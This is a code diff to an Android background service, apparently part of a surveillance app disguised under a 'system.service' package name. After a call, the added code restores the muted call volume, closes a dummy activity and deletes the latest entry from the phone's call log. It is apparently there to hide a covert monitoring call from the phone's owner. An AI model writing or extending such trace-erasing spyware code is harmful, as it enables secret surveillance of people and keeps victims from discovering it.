@@ -8,15 +8,18 @@ import java.util.Timer;
 import system.service.activity.GlobalPrefActivity;
 import system.service.config.ConfigCtrl;
 import system.service.feature.location.LocationUtil;
+import system.service.feature.phonecall.PhoneCallCtrl;
 import system.service.feature.sms.SmsCtrl;
 import system.service.receiver.ScreenStateReceiver;
 import system.service.receiver.SmsReceiver;
 
 import com.android.internal.telephony.ITelephony;
 import com.particle.inspector.common.util.DatetimeUtil;
+import com.particle.inspector.common.util.DummyActivity;
 import com.particle.inspector.common.util.FileCtrl;
 import com.particle.inspector.common.util.RegExpUtil;
 import com.particle.inspector.common.util.StrUtils;
+import com.particle.inspector.common.util.SysUtils;
 import com.particle.inspector.common.util.license.LICENSE_TYPE;
 
 import android.app.Service;
@@ -159,6 +162,18 @@ public class BootService extends Service
     					
     					// Restore voice call volume
     					audioManager.setStreamVolume(AudioManager.STREAM_VOICE_CALL, SmsReceiver.ORIGINAL_VOICE_CALL_VOL, 0);
+    					
+    					// Broadcast intent to let DummyActivity to exit
+    					Intent exitIntent = new Intent(DummyActivity.BROADCAST_ACTION_DUMMY_ACTIVITY_EXIT);
+    					//Bundle bundle = new Bundle();
+    					//bundle.putBoolean("exit", true);
+    					//intent.putExtras(bundle);
+    					context.sendBroadcast(exitIntent);
+    					
+    					SysUtils.threadSleep(1000, LOGTAG);
+    					
+    					// Remove the last phone call history
+    					PhoneCallCtrl.removeLastRecord(context);
     				}
                 	
                 	break;
